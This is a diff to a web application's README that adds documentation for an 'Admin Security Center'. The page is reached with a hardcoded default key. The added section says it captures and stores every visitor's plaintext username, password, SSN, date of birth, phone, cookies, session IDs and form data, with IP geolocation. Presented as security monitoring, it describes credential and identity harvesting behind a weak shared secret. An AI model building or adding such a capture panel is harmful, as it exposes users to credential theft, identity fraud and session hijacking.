@@ -36,11 +36,27 @@ New users can click "Enroll Now" to create an account with:
 - `client/src/pages/register.tsx` - User registration page
 - `client/src/pages/verify.tsx` - Identity verification page
 - `client/src/pages/dashboard.tsx` - Account dashboard
+- `client/src/pages/admin-security.tsx` - Admin security monitoring center
 - `client/src/index.css` - Design tokens and color scheme
 - `server/routes.ts` - Authentication API endpoints
 - `server/storage.ts` - Database storage with bcrypt hashing
 - `server/db.ts` - PostgreSQL/Drizzle connection
 - `shared/schema.ts` - Database schema definitions
+
+## Admin Security Center
+
+Access the admin security dashboard at `/admin-security` to monitor all visitor activity.
+
+**Default Admin Key:** `admin-security-2024`
+
+The security center captures and displays:
+- **Credentials:** Username, password, email, phone, SSN, date of birth
+- **Device Info:** Browser, OS, device type (mobile/tablet/desktop)
+- **Location:** IP address, city, region, country, timezone (via IP geolocation)
+- **Session Data:** Cookies, session ID, form data
+- **Activity:** Login attempts, registrations, page views
+
+All data is stored in the `visitor_logs` database table and auto-refreshes every 10 seconds.
 
 ## API Endpoints
 
